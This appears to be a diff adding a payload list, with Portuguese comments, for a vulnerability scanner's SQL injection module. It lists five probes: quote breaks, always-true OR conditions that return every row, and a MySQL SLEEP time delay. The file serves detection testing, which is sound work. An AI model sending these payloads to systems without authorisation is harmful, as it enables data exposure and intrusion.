@@ -1,0 +1,9 @@
+# Payloads de SQL injection (issue #10). Formato: id<TAB>valor<TAB>descrição.
+# Ordem = ordem de envio: rápidos primeiro, temporal por último (o módulo para no
+# primeiro positivo de cada ponto). Ids sqli-time-* são temporais para o HeuristicDetector.
+
+sqli-quote-single	1'	aspas simples após valor válido: quebra a string e provoca erro de sintaxe
+sqli-quote-double	1"	aspas duplas após valor válido: quebra string delimitada por aspas duplas
+sqli-bool-or-true	' OR '1'='1	booleano sempre verdadeiro: devolve todas as linhas, sem erro
+sqli-bool-or-comment	1' OR 1=1-- -	booleano sempre verdadeiro com comentário fechando o resto da consulta
+sqli-time-mysql-sleep	1' AND SLEEP(5)-- -	temporal MySQL/MariaDB: atrasa a resposta em 5 s se injetável
